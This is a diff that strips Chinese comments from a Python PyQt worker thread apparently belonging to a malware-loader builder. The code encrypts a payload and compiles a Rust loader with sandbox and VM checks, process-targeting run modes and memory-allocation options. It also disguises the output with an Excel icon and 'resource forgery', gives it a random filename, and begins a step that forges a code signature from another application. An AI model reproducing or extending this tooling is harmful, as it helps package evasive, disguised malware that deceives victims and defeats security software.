@@ -1,7 +1,3 @@
-"""
-工作线程模块
-负责在后台执行加密、构建和打包任务
-"""
 import os
 import sys
 import subprocess
@@ -21,9 +17,6 @@ from .config_manager import (
 
 
 class WorkerThread(QThread):
-    """
-    后台工作线程，执行加密、编译、打包、签名等任务
-    """
     log_signal = pyqtSignal(str)
     progress_signal = pyqtSignal(int)
     done_signal = pyqtSignal(str)
@@ -34,7 +27,6 @@ class WorkerThread(QThread):
         self.params = params
 
     def run(self):
-        """执行完整的构建流程"""
         try:
             self._encrypt_payload()
             self._build_rust_project()
@@ -48,12 +40,10 @@ class WorkerThread(QThread):
             self.error_signal.emit(str(e))
 
     def _encrypt_payload(self):
-        """加密payload"""
         self.progress_signal.emit(0)
         self.log_signal.emit('加密中...')
         self.progress_signal.emit(10)
         
-        # 从配置映射到 encrypt.py 所需方法名
         enc_map = get_encryption_map()
         enc_method_arg = enc_map.get(
             self.params['enc_method'], 
@@ -76,20 +66,16 @@ class WorkerThread(QThread):
         self.progress_signal.emit(40)
 
     def _build_rust_project(self):
-        """构建Rust项目"""
         self.log_signal.emit('Rust 构建中...')
         
-        # 使用用户选择的target
         self.target = self.params.get('target', 'x86_64-pc-windows-msvc')
         
-        # 动态生成Cargo feature参数
         features = self._build_features_list()
         features_str = ','.join(features)
         
         self.log_signal.emit(f'本次编译启用 features: {features_str}')
         self.log_signal.emit(f'编译目标: {self.target}')
         
-        # 设置环境变量用于生成target.rs
         manifest = load_plugins_manifest()
         run_modes = manifest['run_modes']
         run_mode_id = self.params['run_mode']
@@ -105,10 +91,8 @@ class WorkerThread(QThread):
         elif pattern == 3:
             env_vars['RSL_TARGET_PID'] = self.params.get('target_pid', '0')
         
-        # 设置图标路径环境变量
         env_vars['RSL_ICON_PATH'] = self.params.get('icon_path', 'icons/excel.ico')
         
-        # 构建环境变量字符串
         env_cmd_parts = []
         for key, value in env_vars.items():
             env_cmd_parts.append(f'set "{key}={value}" && ')
@@ -130,16 +114,13 @@ class WorkerThread(QThread):
         self.progress_signal.emit(50)
 
     def _build_features_list(self):
-        """构建features列表"""
         manifest = load_plugins_manifest()
         features = []
         
-        # VM检测features
         vm_map = get_vm_checks_map()
         selected = self.params.get('vm_checks', '').split(',') if self.params.get('vm_checks') else []
         features.extend([vm_map[t] for t in selected if t in vm_map])
         
-        # 加密方式feature
         enc_feature_map = get_encryption_feature_map()
         default_enc = get_default_value('encryption') or 'chacha20-aes'
         enc_feature = enc_feature_map.get(
@@ -148,7 +129,6 @@ class WorkerThread(QThread):
         )
         features.append(enc_feature)
         
-        # 编码方式feature (解码对应)
         encoding_feature_map = get_encoding_feature_map()
         default_encoding = get_default_value('encoding') or 'base64'
         encoding_feature = encoding_feature_map.get(
@@ -157,7 +137,6 @@ class WorkerThread(QThread):
         )
         features.append(encoding_feature)
         
-        # 运行模式feature
         run_map = get_run_mode_map()
         default_run = get_default_value('run_mode') or 'enum_ui'
         run_feature = run_map.get(
@@ -166,25 +145,21 @@ class WorkerThread(QThread):
         )
         features.append(run_feature)
         
-        # 内存分配方式feature
         mem_feature_map = get_alloc_mem_feature_map()
         default_mem = get_default_value('alloc_mem_mode') or 'alloc_mem_va'
         mem_mode = self.params.get('mem_mode', default_mem)
         mem_feature = mem_feature_map.get(mem_mode, 'alloc_mem_va')
         features.append(mem_feature)
         
-        # 资源伪造
         if self.params.get('forgery_enable'):
             features.append('with_forgery')
         
-        # Win7 兼容 feature
         if self.params.get('win7_compat', False):
             features.append('win7')
         
         return features
 
     def _copy_output(self):
-        """复制输出文件"""
         self.log_signal.emit('复制输出...')
         
         src_file = os.path.join('target', self.target, 'release', 'rsl.exe')
@@ -193,7 +168,6 @@ class WorkerThread(QThread):
         if not os.path.exists(out_dir):
             os.makedirs(out_dir)
         
-        # 生成随机文件名
         import random
         import string
         rand_name = ''.join(random.choices(string.ascii_letters, k=6)) + '.exe'
@@ -208,7 +182,6 @@ class WorkerThread(QThread):
         return dst_file
 
     def _sign_executable(self, dst_file):
-        """伪造签名"""
         app_path = self.params['sign_app']
         if not app_path:
             raise ValueError('未选择被伪造应用的路径！')
